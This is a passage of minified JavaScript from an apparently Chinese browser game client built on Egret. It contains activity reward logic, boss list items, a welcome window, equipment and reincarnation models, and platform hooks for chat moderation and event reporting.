a=t.readByte()-1,r=t.readByte(),l=t.readInt(),h=t.readInt(),u=t.readByte(),p={type:r,id:l,count:h,"double":u};this.changIndex=a,this.boxs[a]=p,this.houses.push(p),n.push(p),o.push(a),this.checkBigReward(p)}return e&&(this.houses.length=0),this.openIndexs=o,this.changIndex},e.prototype.checkBigReward=function(t){if(null!=this.bigRewardId&&this.bigRewardId==t.id){var e={id:t.id,count:t.count,type:t.type,"double":t["double"]};this.bigRewardState[this.select-1]=1,s.Act62JiPingItemTipsWin.openCheck(e,this.reStart,this,s.Act62JiPingItemTipsWin.ACT_62_1)?win.open(s.Act62JiPingItemTipsWin,e,this.reStart,this,s.Act62JiPingItemTipsWin.ACT_62_1,this.id):this.reStart()}},e.prototype.reStart=function(){win.open(o.Act62HouseWin,e.t.id);var t=n.GlobalConfig.ActivityType62Config[e.t.id],i=Object.keys(t);e.t.select>=parseInt(i[i.length-1])||(e.t.bigRewardId=null,e.t.select=0,e.t.openIndexs.length=0)},e.prototype.getCurLayer=function(){var t=this.bigRewardState.filter(function(t){return 0==t});if(t.length>0)return this.curLayer;var e=this.curLayer,i=n.GlobalConfig.ActivityType62Config[this.id],o=Object.keys(i);return e>=parseInt(o[o.length-1])?e:e+1},e.prototype.getBigRewardState=function(){var t=this.bigRewardState.filter(function(t){return 0==t});return 0==t.length?[]:this.bigRewardState},__decorate([post()],e.prototype,"reStart",null),e}(a.ActivityBaseData);e.ActivityType62Data=r,window.ActivityType62Data=r,__reflect(r.prototype,"ActivityType62Data",[]),window.ActivityType62Data=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Act62JiPingItemTipsWin=void 0;var n=i(21),o=i(8),s=i(1),a=i(0),r=i(10),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="osa62p1rewardtipskin",e.layer=LayoutNum.top,e.mc=new n.MovieClip,e.type=0,e.useType=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.mc.x=111,this.mc.y=119,this.mc.touchEnabled=!1,this.group.touchEnabled=!1},e.prototype.addDisplay=function(t,e,i,n,s){this.closeBtn0.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this),this.checkBox.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this),this.itemData=t,this.closeCaller=e,this.type=n,this.actId=s,this.mc.playFile(RES_DIR_EFF+"jlcq}",-1),this.setData(),Timer.start(5*o.DateUtils.MS_PER_SECOND,1,this.countDown1,this)},e.openCheck=function(t,i,n,o){return 1==e.tishiData[o]?!1:!0},e.prototype.countDown1=function(){win.close(this)},e.prototype.removeDisplay=function(){Timer.stop(this.countDown1,this),this.closeCaller&&this.closeCaller()},e.prototype.setData=function(){this.itemIcon.data=this.itemData;var t=a.GlobalConfig.ItemConfig[this.itemData.id];this.lbName.text=t.name;var e=r.ItemUtil.getQuality2(a.GlobalConfig.ItemConfig[this.itemData.id]);this.lbName.textColor=r.ItemUtil.getQualityColor(e)},e.prototype.onClick=function(t){switch(t.currentTarget){case this.closeBtn0:this.countDown1();break;case this.checkBox:e.tishiData[this.type]=this.checkBox.selected}},e.JIN_ZUAN=0,e.XUN_BAO=1,e.ACT_6_1=2,e.ACT_62_1=2,e.ACT_DW=3,e.tishiData={},e}(s.BaseView);e.Act62JiPingItemTipsWin=l,window.Act62JiPingItemTipsWin=l,__reflect(l.prototype,"Act62JiPingItemTipsWin",[]),window.Act62JiPingItemTipsWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType52Data=void 0;var n=i(8),o=i(0),s=i(4),a=i(6),r=i(10),l=i(7),h=i(33),u=function(t){function e(e){var i=t.call(this,e)||this;return i.indexsEx=[],i.itemList=[],i.update(e),i}return __extends(e,t),e.prototype.update=function(t){this.hasLottery=t.readInt(),this.totoYb=t.readInt();for(var e=t.readInt(),i=0;e>i;i++)this.addTips(t)},e.prototype.postRewardResult=function(t){t.readUnsignedShort();this.hasLottery=t.readUnsignedShort(),this.totoYb=t.readInt();var e=t.readByte();this.indexs=[];for(var i=0;e>i;i++)this.indexs.push(t.readUnsignedShort());this.indexs.length&&(this.indexsEx=this.indexs),this.itemList=[],e=t.readUnsignedShort();for(var i=0;e>i;i++){var n=t.readInt(),o=t.readInt();this.itemList.push({type:1,id:n,count:o})}return this.id},e.prototype.addTips=function(t){this.tips||(this.tips=[]);var e=t.readInt(),i=t.readString(),n=t.readInt(),s=t.readInt();if(0==s){var a=o.GlobalConfig.ActivityType52Config[e][n];s=a.showReward.id}var l=t.readInt(),h=o.GlobalConfig.ItemConfig[s],u=r.ItemUtil.getQualityColor2(h),p=gettext("{0}获得:|C:{1}&T:{2}|",i,u,h.name)+(-1==l?"":gettext("，获得|C:{0}&T:{1}元宝|",u,l));this.tips.unshift(p),this.tips.length=Math.min(50,this.tips.length)},e.prototype.addTips2=function(t){this.totoYb=t.readInt(),this.tips||(this.tips=[]);var e=t.readString(),i=t.readInt(),n=t.readInt();if(0==n){var s=o.GlobalConfig.ActivityType52Config[this.id][i];
n=s.showReward.id}var a=t.readInt(),l=o.GlobalConfig.ItemConfig[n],h=r.ItemUtil.getQualityColor2(l),u=gettext("{0}获得:|C:{1}&T:{2}|",e,h,l.name)+(-1==a?"":gettext("，获得|C:{0}&T:{1}元宝|",h,a));this.tips.unshift(u),this.tips.length=Math.min(50,this.tips.length)},e.prototype.isOpenActivity=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-l.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-l.GameServerCC.serverTime)/1e3);return 0>t&&e>0?!0:!1},e.prototype.getRemainTime=function(){var t,e=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-l.GameServerCC.serverTime)/1e3),i=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-l.GameServerCC.serverTime)/1e3);return t=e>=0?gettext("活动未开启"):0>=i?gettext("活动已结束"):n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3)},e.prototype.getRollSum=function(t){var e=o.GlobalConfig.ActivityType52Config[t];if(e&&e[0]){var i=a.BagCT.ins().getBagItemById(e[0].item);if(i)return!0}return!1},e.prototype.getIsRollTen=function(t){var e=o.GlobalConfig.ActivityType52Config[t][0];if(!e)return!1;var i=0;if(e.item){var n=a.BagCT.ins().getBagItemById(e.item);if(n&&(i+=n.count),i>=10)return!0}return i=10-i,e.yb&&s.ActorCC.yb>=e.yb*i?!0:void 0},__decorate([post()],e.prototype,"postRewardResult",null),e}(h.ActivityBaseData);e.ActivityType52Data=u,window.ActivityType52Data=u,__reflect(u.prototype,"ActivityType52Data",[]),window.ActivityType52Data=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KuaFuRankData=void 0;var n=function(){function t(){this.actorId=0,this.rmb=0,this.rank=0,this.serverName=0,this.serverId=0,this.roleName="",this.job=0,this.sex=0}return t}();e.KuaFuRankData=n,window.KuaFuRankData=n,__reflect(n.prototype,"KuaFuRankData",[]),window.KuaFuRankData=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MainMapBossItem2=e.MainMapBossItem=void 0;var n=i(8),o=i(3),s=i(11),a=i(0),r=i(43),l=i(23),h=i(7),u=i(114),p=i(27),d=i(26),c=i(64),f=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.t=0,e}return __extends(e,t),e.prototype.createChildren=function(){Timer.stopAll(this),this.labGo.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this)},e.prototype.dataChanged=function(){var t,e;this.costNum0.parent.visible=!1,this.data.bossId?(e=a.GlobalConfig.MonstersConfig[this.data.bossId],this.labBoss.text=(null===e||void 0===e?void 0:e.name)||"",(3==this.data.TypeId||5==this.data.TypeId)&&e.crusade&&e.crusade>0&&(this.costNum0.parent.visible=!0,this.costNum0.text=e.crusade+"")):this.labBoss.text="--";var i=a.GlobalConfig.InstanceConfig[this.data.fbId];if(this.labMap.text=(null===i||void 0===i?void 0:i.name)||"",this.labPow.text=""+((null===i||void 0===i?void 0:i.powerlimit)||0),i&&i.newFunc&&i.newFunc.length){for(var o="",s=0,l=i.newFunc;s<l.length;s++){var u=l[s];o+=u+" "}this.labTime.text=o}else if(this.labTime.text=e?gettext("已复活"):"--",this.t=(null===(t=r.CityCC.ins().mapBossList[this.data.bossId])||void 0===t?void 0:t.time)||0,this.t){if(!((n.DateUtils.formatMiniDateTime(this.t)-h.GameServerCC.serverTime)/1e3<=0)){var p=(n.DateUtils.formatMiniDateTime(this.t)-h.GameServerCC.serverTime)/1e3;this.labTime.text=n.DateUtils.getFormatBySecond(p,n.DateUtils.TIME_FORMAT_1)}Timer.start(1e3,0,this.timeFun,this)}},e.prototype.timeFun=function(){var t=(n.DateUtils.formatMiniDateTime(this.t)-h.GameServerCC.serverTime)/1e3;if(0>=t){var e=a.GlobalConfig.MonstersConfig[this.data.bossId];return this.labTime.text=e?gettext("已复活"):"--",void Timer.stop(this.timeFun,this)}this.labTime.text=n.DateUtils.getFormatBySecond(t,n.DateUtils.TIME_FORMAT_1)},e.prototype.onClick=function(){r.CityCC.ins().sendCityGo(1,this.data.fbId),c.MainUICC.onClickMap(!1)},e}(o.BaseItemRender);e.MainMapBossItem=f,window.MainMapBossItem=f,__reflect(f.prototype,"MainMapBossItem",[]);var g=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.t=0,e}return __extends(e,t),e.prototype.createChildren=function(){Timer.stopAll(this),this.gobtn.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this),this.list.itemRenderer=s.ItemBase,this.list.dataProvider=this.listArr=new eui.ArrayCollection([])},e.prototype.dataChanged=function(){var t,e=a.GlobalConfig.MonstersConfig[this.data.bossId||0];this._cfg=e,this.nameLab.text=(null===e||void 0===e?void 0:e.name)||"",this.img.source="monhead"+(null===e||void 0===e?void 0:e.head)+"_png"||!1,this.listArr.replaceAll(this.data.item||[]),this.time.text=gettext("已复活"),this.time.textColor=2149168,this.t=(null===(t=u.KFBossSys.ins().kfBossList[this.data.id])||void 0===t?void 0:t.time)||0;var i=d.ZsCT.ins().stage>=this.data.zsLevel;if(this.gobtn.visible=i,this.noGoLab.text=i?"":gettext("{0}转可挑战",this.data.zsLevel),this.costNum.text=""+e.crusade||"",this.t){if(!((n.DateUtils.formatMiniDateTime(this.t)-h.GameServerCC.serverTime)/1e3<=0)){var o=(n.DateUtils.formatMiniDateTime(this.t)-h.GameServerCC.serverTime)/1e3;this.time.text=n.DateUtils.getFormatBySecond(o,n.DateUtils.TIME_FORMAT_1),this.time.textColor=16720161}Timer.start(1e3,0,this.timeFun,this)}var s=a.GlobalConfig.InstanceConfig[this.data.fbId];this.showPow.text=gettext("推荐战力:{0}",(null===s||void 0===s?void 0:s.powerlimit)||0)},e.prototype.timeFun=function(){var t=(n.DateUtils.formatMiniDateTime(this.t)-h.GameServerCC.serverTime)/1e3;return 0>=t?(this.time.text=gettext("已复活"),this.time.textColor=2149168,void Timer.stop(this.timeFun,this)):(this.time.text=n.DateUtils.getFormatBySecond(t,n.DateUtils.TIME_FORMAT_1),void(this.time.textColor=16720161))},e.prototype.onClick=function(){var t,e=this;l.GameLogic.ins().kfCost<(null===(t=this._cfg)||void 0===t?void 0:t.crusade)?p.WarnWin.show(gettext("讨伐令不足，击杀后将无法获得奖励。是否进入？"),function(){u.KFBossSys.ins().sendKfBossGo(e.data.id),c.MainUICC.onClickMap(!1)},this):(u.KFBossSys.ins().sendKfBossGo(this.data.id),c.MainUICC.onClickMap(!1))},e}(o.BaseItemRender);e.MainMapBossItem2=g,window.MainMapBossItem2=g,__reflect(g.prototype,"MainMapBossItem2",[]),window.MainMapBossItem2=g,window.MainMapBossItem=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType5Data=void 0;var n=i(8),o=i(17),s=i(0),a=i(7),r=i(9),l=i(33),h=function(t){function e(e){var i=this;if(e)return i=t.call(this,e)||this,i.recrod=e.readInt(),i.initRps(),i}return __extends(e,t),Object.defineProperty(e.prototype,"logTime",{get:function(){return this._logTime||0},set:function(t){this._logTime=t},enumerable:!1,configurable:!0}),e.prototype.updateRecord=function(t){this.recrod=t.readInt()},e.prototype.update=function(e){t.prototype.update.call(this,e);e.readShort();this.recrod=e.readInt()},e.prototype.updateData=function(t){this.logTime=t.readInt()},e.prototype.isOpenActivity=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-a.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-a.GameServerCC.serverTime)/1e3);return 0>t&&e>0?!0:!1},e.prototype.canReward=function(t){void 0===t&&(t=0),0==t&&(t=this.logTime);var e=this.activityType==l.ActivityType.Personal?s.GlobalConfig.PActivityType5Config[this.id]:s.GlobalConfig.ActivityType5Config[this.id];for(var i in e){var n=this.recrod>>e[i].index&1;if(0==n&&e[i].day<=this.logTime)return!0}return!1},e.prototype.checkOneDayStatu=function(t){void 0===t&&(t=0),0==t&&(t=this.logTime);var e=this.recrod>>t&1;return 0==e?!0:!1},e.prototype.getCurDay=function(){var t=this.logTime;return t},e.prototype.getRemainTime=function(){var t,e=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-a.GameServerCC.serverTime)/1e3),i=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-a.GameServerCC.serverTime)/1e3);return t=e>=0?gettext("活动未开启"):0>=i?gettext("活动已结束"):n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3)},e.prototype.getRewardState=function(t){return this.getCurDay()>=t?0==(this.recrod>>t&1)?1:2:0},e.prototype.initRps=function(){var t=this;this.rp=new o.RedPoint(function(){return window.platform.isshen()?!1:t.canReward(t.id)},r.Activity.ins().postRewardResult,r.Activity.ins().postChangePage,r.Activity.ins().postActivityIsGetAwards)},e}(l.ActivityBaseData);e.ActivityType5Data=h,window.ActivityType5Data=h,__reflect(h.prototype,"ActivityType5Data",[]),window.ActivityType5Data=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WelcomeWin=void 0;var n=i(61),o=i(103),s=i(1),a=i(11),r=i(350),l=i(0),h=i(4),u=i(30),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="welcomePanelSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return this.item.visible=!1,n.LocationProperty.isIosTS?(this.visible=!1,void win.close("WelcomeWin")):(this.rewardList.itemRenderer=a.ItemBase,this.addTouchEvent(this,this.onTap),void this.update())},e.prototype.update=function(){var t=l.GlobalConfig.LoginRewardsBasicConfig;if(t&&(null===t||void 0===t?void 0:t.initItemByJob)){var e=t.initItemByJob[h.ActorCC.jobId-1];this.list=u.RewardData.objectsToRewardDatas(e),this.rewardList.dataProvider=new eui.ArrayCollection(e)}},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.skin&&egret.Tween.removeTweens(this.pic)},e.prototype.onTap=function(t){var e=this,i=egret.Tween.get(this.list),n=function(t){s.item.visible=!0,i.wait(300).call(function(){e.flyItem(e.item,e.list[t])})},s=this;for(var a in this.list)n(a);var r=egret.Tween.get(this.sureGroup);r.to({scaleX:0,scaleY:0,horizontalCenter:-o.StageUtils.ins().getWidth()/2+80,verticalCenter:-o.StageUtils.ins().getHeight()/2+165+98},500).call(function(){win.close("WelcomeWin")})},e.prototype.flyItem=function(t,e){if(e.count){var i=new r.ItemBaseNoTap;i.x=t.x,i.y=t.y,i.scaleX=i.scaleY=.7,i.data=e,i.anchorOffsetX=i.width/2,i.anchorOffsetY=i.height/2,t.parent.addChild(i)}},e}(s.BaseView);e.WelcomeWin=p,window.WelcomeWin=p,__reflect(p.prototype,"WelcomeWin",[]),window.WelcomeWin=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemBaseNoTap=void 0;var n=i(11),o=function(t){function e(){var e=t.call(this)||this;return e.touchChildren=!1,e.touchEnabled=!0,e}return __extends(e,t),e.prototype.onClick=function(){},e}(n.ItemBase);e.ItemBaseNoTap=o,window.ItemBaseNoTap=o,__reflect(o.prototype,"ItemBaseNoTap",[]),window.ItemBaseNoTap=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HeirloomSlot=e.HeirloomData=void 0;var n=i(0),o=function(){function t(){this.heirloomData=[]}return t.prototype.parser=function(t){for(var e=0;10>e;e++){var i=t.readByte();this.heirloomData[e]=n.GlobalConfig.HeirloomEquipConfig[e+1][i]||this.newCfg(e+1)}},t.prototype.update=function(t,e){this.heirloomData[t-1]=n.GlobalConfig.HeirloomEquipConfig[t][e]||this.newCfg(t)},t.prototype.newCfg=function(t){var e={slot:t||0,lv:0,expend:{id:0,count:0},attr:[],icon:0,name:"",image:"",model:"",skillicon:"",skillname:"",skilldesc:"",attr_add:0};return e},t.prototype.getData=function(){return this.heirloomData},t.prototype.getInfoBySolt=function(t){if(t>=0&&10>t){var e=this.heirloomData[t];if(e)return e}return null},t.getInfoBySoltFirst=function(t){if(t>=0&&10>t){var e=n.GlobalConfig.HeirloomEquipConfig[t+1][1];return e}return null},t.getEquipName=function(t){var e="";switch(t+1){case s.wq:e=gettext("武器");break;case s.tk:e=gettext("头盔");break;case s.yf:e=gettext("衣服");break;case s.xl:e=gettext("项链");break;case s.hw:case s.hw2:e=gettext("护腕");break;case s.yd:e=gettext("腰带");break;case s.jz:case s.jz2:e=gettext("戒指");break;case s.xz:e=gettext("鞋子")}return e},t.prototype.getSuitConfig=function(t){for(var e=t.heirloom.getData(),i=0,o=!0,s=0;s<e.length;s++){var a=e[s];0==s&&(i=a.lv),!a.lv&&o&&(o=!1),a.lv<=i&&(i=a.lv)}var r;return o&&(r=n.GlobalConfig.HeirloomEquipSetConfig[i]),r},t}();e.HeirloomData=o,window.HeirloomData=o,__reflect(o.prototype,"HeirloomData",[]);var s;!function(t){t[t.wq=1]="wq",t[t.tk=2]="tk",t[t.yf=3]="yf",t[t.xl=4]="xl",t[t.hw=5]="hw",t[t.hw2=6]="hw2",t[t.yd=9]="yd",t[t.jz=8]="jz",t[t.jz2=7]="jz2",t[t.xz=10]="xz"}(s=e.HeirloomSlot||(e.HeirloomSlot={})),window.HeirloomSlot=s,window.HeirloomData=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ReportData=void 0;var n=i(2),o=i(45),s=i(7),a=i(26),r=i(4),l=i(28),h=function(){function t(){}return t.checkChat=function(t,e,i){return new Promise(function(l){if(!o.ChatCT.ins().isCanSpeak())return void l({result:"",content:""});var h=window.checkChat;if(!h){var u="success",p=t;return void l({result:u,content:p})}h({server_id:s.GameServerCC.serverID,server_name:"",chat_type:1,chat_channel:e,chat_content:t,sender_openId:urlParam.openId,sender_level:1e3*a.ZsCT.ins().lv+r.ActorCC.level,sender_name:r.ActorCC.myName,sender_vip_level:r.ActorCC.vip,receiver_openId:i&&i.openId,receiver_name:i&&i.name,receiver_appId:i&&i.appId,open_time:s.GameServerCC.serverOpenDay},function(t){var e=t.result,i=(t.code,t.content),o=t.failMsg;"self"==e||"success"==e?l({result:e,content:i}):n.TipsCT.ins().showCenterTips(o||gettext("未配置提示"))})})},t.chackParty=function(t){return new Promise(function(e){var i=window.checkParty;return i?void i({server_id:s.GameServerCC.serverID,server_name:"",op_type:1,name:l.Guild.ins().guildName,leader_rid:l.Guild.ins().guildMaster&&l.Guild.ins().guildMaster.roleID,leader_name:l.Guild.ins().guildMaster&&l.Guild.ins().guildMaster.name,vice_leader_rid:l.Guild.ins().deputyMaster&&l.Guild.ins().deputyMaster.roleID,vice_leader_name:l.Guild.ins().deputyMaster&&l.Guild.ins().deputyMaster.roleID,edit_rid:r.ActorCC.actorID,edit_name:r.ActorCC.myName,notice:t},function(t){var i=t.result,o=t.code,s=t.content;"success"==i?e(s):n.TipsCT.ins().showCenterTips(gettext("内容涉及敏感词或被禁止该操作! {0}",o))}):void e(t)})},t.report=function(t,e){switch(t){case"entergame":t="login";break;case"createRole":t="create_role";break;case"levelup":break;case"power":t="power";break;default:t=""}if(t){var i=window.reprot;i&&i({action:t,app_openid:"",server:urlParam.srvid,serverName:"",openId:urlParam.openId,nickName:r.ActorCC.myName,roleName:r.ActorCC.myName,openKey:urlParam.openKey,level:r.ActorCC.level||1,relifeLevel:a.ZsCT.ins().lv||0,power:r.ActorCC.power,vip:r.ActorCC.vip,gangName:l.Guild.ins().guildName,balance:r.ActorCC.yb})}},t.ERROR="error",t}();e.ReportData=h,window.ReportData=h,__reflect(h.prototype,"ReportData",[]),window.ReportData=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SamsaraModel=void 0;var n=i(50),o=i(24),s=i(0),a=i(4),r=i(13),l=i(30),h=i(6),u=i(40),p=i(10),d=i(62),c=i(26),f=function(t){function e(){var e=t.call(this)||this;return e.composeEquipMap={},e.composeEquipTypes=[],e.equipCompose={},e.samsaraDescAry=s.GlobalConfig.ReincarnationBase.names,e.initComposeEquip(),e.composeEquipTypes=e.getComposeMenu(),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.isCanUpgrade=function(){if(!this.samsaraInfo)return!1;var t=this.samsaraInfo.lv,e=t+1,i=s.GlobalConfig.ReincarnationLevel[e],n=!1;return i?(e<o.CommonUtils.getObjectLength(s.GlobalConfig.ReincarnationLevel)&&this.samsaraInfo.exp>=i.consume&&(n=!0),n):n},e.prototype.getExpExchangeTimes=function(){if(!this.samsaraInfo)return 0;var t=s.GlobalConfig.ReincarnationBase.levelExchangeTimes-this.samsaraInfo.expUpgradeNum;return t},e.prototype.getNormalExchangeTimes=function(){if(!this.samsaraInfo)return 0;var t=s.GlobalConfig.ReincarnationBase.normalItem.time-this.samsaraInfo.normalUpgradeNum;return t},e.prototype.getAdvancedExchangeTimes=function(){if(!this.samsaraInfo)return 0;var t=s.GlobalConfig.ReincarnationBase.advanceItem.time-this.samsaraInfo.advancedUpgradeNum;return t},e.prototype.isCanExpExchange=function(){var t=!1;return a.ActorCC.level>=s.GlobalConfig.ReincarnationBase.levelLimit&&this.getExpExchangeTimes()>0&&(t=!0),t},e.prototype.isCanItemExchange=function(){var t;return this.getNormalExchangeTimes()>0&&(t=h.BagCT.ins().getBagGoodsCountById(h.BagCT.BAG_TYPE_OTHTER,s.GlobalConfig.ReincarnationBase.normalItem.id),t>0)?!0:this.getAdvancedExchangeTimes()>0&&(t=h.BagCT.ins().getBagGoodsCountById(h.BagCT.BAG_TYPE_OTHTER,s.GlobalConfig.ReincarnationBase.advanceItem.id),t>0)?!0:!1},e.prototype.isCanExchange=function(){return this.isMaxSamsara(a.ActorCC.samsaraLv)?!1:this.isCanExpExchange()||this.isCanItemExchange()},e.prototype.isOpen=function(){var t=1e3*c.ZsCT.ins().lv+a.ActorCC.level;return t>=s.GlobalConfig.ReincarnationBase.openLevel},e.prototype.isMaxSamsara=function(t){var e=o.CommonUtils.getObjectLength(s.GlobalConfig.ReincarnationLevel),i=s.GlobalConfig.ReincarnationLevel[e-1];return i?t>=i.level:!1},e.prototype.lowSuitEquips=function(t,e){for(var i=[],n=this.getEquipSamsaraLvByRole(t,e),o=d.EquipPos.HAT;o<d.EquipPos.MAX;o++){var s=this.getEquipSamsaraLvByRole(o,e);n>s?i.push(0):i.push(1)}return i},e.prototype.getEquipSamsaraLvByRole=function(t,e){var i=e.getEquipByIndex(t);return i.item.itemConfig?this.getEquipSamsaraLv(i.item.itemConfig.id):0},e.prototype.getEquipSamsaraLv=function(t){var e=s.GlobalConfig.ItemConfig[t].zsLevel;return e},e.prototype.getReincarnateSuit=function(t){var e=s.GlobalConfig.ItemConfig[t].zsLevel;return s.GlobalConfig.ReincarnateSuit[e]},e.prototype.getSamsara=function(t){var e=0;return t>=7&&(e=Math.ceil((t-6)/6)),e},e.prototype.getSamsaraDesc=function(t){return this.samsaraDescAry[t]},e.prototype.getSamsaraLv=function(t){var e=0;return e=0==t?-1:Math.ceil((t-1)%6)},e.prototype.getSamsaraLvDesc=function(t){var e=t+1;return s.GlobalConfig.ReincarnationBase.state[e]},e.prototype.getAddSpiritEquips=function(t,e,i){void 0===i&&(i=10);var n=[],o=r.SubRoles.ins(),a=h.BagCT.ins().bagModel[h.BagCT.BAG_TYPE_EQUIP],l=s.GlobalConfig.ReincarnateEquip,u=s.GlobalConfig.ReincarnateEquipCompose;if(!a||!a.length)return n;for(var p=0,d=a;p<d.length;p++){var c=d[p];if(l[c.configID]){var f=c.subType,g=c.job;if(t=o.getSubRoleByJob(g)){var m=t.getEquipByIndex(f),v=m.item;if(!v.itemConfig)break;var y=u[v.configID],C=(y?y.distinguishi:0)-1;if(c.itemConfig.zsLevel<v.itemConfig.zsLevel+C&&(n.push(c),n.length>=i))break}}}return n},e.prototype.isCanAddSpirit=function(){for(var t=0,e=r.SubRoles.ins().roles;t<e.length;t++)for(var i=e[t],n=d.EquipPos.HAT;n<d.EquipPos.MAX;n++){var o=i.getEquipByIndex(n);if(o.item.itemConfig){var s=this.getAddSpiritEquips(i,n,1);if(s.length>0)return!0}}return!1},e.prototype.checkRoleCanAddSpirit=function(t){for(var e=r.SubRoles.ins().getSubRoleByIndex(t),i=d.EquipPos.HAT;i<d.EquipPos.MAX;i++){var n=e.getEquipByIndex(i);if(n.item.itemConfig){var o=this.getAddSpiritEquips(e,i,1);if(o.length>0)return!0}}return!1},e.prototype.checkEquipPosCanAddSpirit=function(t,e){var i=t.getEquipByIndex(e);if(i.item.itemConfig&&!this.checkSpiritLvIsMax(i,e)){var n=this.getAddSpiritEquips(t,e,1);if(n.length>0)return!0}return!1},e.prototype.checkSpiritLvIsMax=function(t,e){var i=t.spiritLv;return!s.GlobalConfig.ReincarnateSpirit[e][i+1]},e.prototype.getExtraPower=function(t,e,i){var n=0,o=0;if(i){var a=s.GlobalConfig.AttrPowerConfig,r=a[i];n=o*r.relate_power*e}return n},e.prototype.initComposeEquip=function(){for(var t=s.GlobalConfig.ReincarnationBase.headName,e=t.length,i=1;e>=i;i++)this.composeEquipMap[i]||(this.composeEquipMap[i]={});for(var n in s.GlobalConfig.ReincarnateEquipCompose){var o=s.GlobalConfig.ReincarnateEquipCompose[n];this.equipCompose[o.material.id]=o;var a=o.distinguishi,r=this.composeEquipMap[a],l=s.GlobalConfig.ItemConfig[o.id],h=l.zsLevel,u=r[h];u||(u=[]),r[h]=u,this.composeEquipMap[a]=r}},e.prototype.getComposeMenu=function(){for(var t=s.GlobalConfig.ReincarnationBase.headName,e=t.length,i=[],n=1;e>=n;n++)i.push(n);return i},e.prototype.getComposeZsList=function(t){var e=c.ZsCT.ins().lv,i=s.GlobalConfig.ReincarnationBase.equipsList[t-1],n=[];for(var o in i)i[o]<=e&&n.push({type:t,zsLv:i[o]});return n},e.prototype.getComposeDesc=function(t){return s.GlobalConfig.ReincarnationBase.headName[t-1]},e.prototype.isCanCompose=function(){return this.getComposeEquipList().length>0},e.prototype.getComposeEquipId=function(t,e){var i=0,n=this.getComposeEquipList();for(var o in n){var a=n[o],r=this.getComposeTarget(a);if(s.GlobalConfig.ItemConfig[r].zsLevel==e&&s.GlobalConfig.ReincarnateEquipCompose[r].distinguishi==t)return a}return i},e.prototype.getComposeEquipList=function(){var t=[],e=h.BagCT.ins().itemCount[1];for(var i in e)if(this.equipCompose[i]){var n=+i,o=this.composeMaxEquip(n);o&&this.isCanWear(o)&&t.push(n)}return t},e.prototype.isCanWear=function(t){if(!t)return!1;var e=s.GlobalConfig.ItemConfig[t],i=1e3*c.ZsCT.ins().lv+a.ActorCC.level,n=1e3*e.zsLevel+e.level;if(n>i)return!1;var o=p.ItemUtil.getJob(e),l=p.ItemUtil.getSubType(e),h=r.SubRoles.ins().getSubRoleByJob(o);if(!h)return!1;var d=h.getEquipByIndex(l),f=d.item.itemConfig;if(!f)return!0;var g=d.item.point,m=new u.ItemData;m.configID=t;var v=m.point;return v>g?!0:!1},e.prototype.composeMaxEquip=function(t){var e=h.BagCT.ins().getBagGoodsCountById(h.BagCT.BAG_TYPE_EQUIP,t);if(e){var i=new l.RewardData;i.id=t,i.count=0;var n=this.composeEquip(i);if(n&&n.id!=t)return n.id}return 0},e.prototype.composeEquip=function(t){var e,i=t.id,n=t.count+h.BagCT.ins().getBagGoodsCountById(h.BagCT.BAG_TYPE_EQUIP,i)+this.wearCount(i),o=this.equipCompose[i];return o&&n>=o.material.count?(e=new l.RewardData,e.id=o.id,e.count=Math.floor(n/o.material.count),this.composeEquip(e)):t},e.prototype.wearCount=function(t){var e=s.GlobalConfig.ItemConfig[t],i=p.ItemUtil.getJob(e),n=r.SubRoles.ins().getSubRoleByJob(i);if(!n)return 0;var o=p.ItemUtil.getSubType(e),a=n.getEquipByIndex(o),l=a.item.itemConfig;return l&&l.id==t?1:0},e.prototype.getRoleIndexByEquip=function(t){for(var e=s.GlobalConfig.ItemConfig[t],i=p.ItemUtil.getJob(e),n=p.ItemUtil.getSubType(e),o=r.SubRoles.ins().subRolesLen,a=0;o>a;a++){var l=r.SubRoles.ins().getSubRoleByIndex(a);if(l.job==i){var h=l.getEquipByIndex(n),u=h.item.itemConfig;if(u&&u.id==t)return a}}return-1},e.prototype.isCanTypeCompose=function(t){var e=this.getComposeEquipList();for(var i in e){var n=e[i],o=s.GlobalConfig.ReincarnateEquipCompose[this.getComposeTarget(n)];if(o.distinguishi==t)return!0}return!1},e.prototype.getComposeTarget=function(t){var e=this.equipCompose[t];return e?e.id:0},e.prototype.isCanZsLvCompose=function(t,e){var 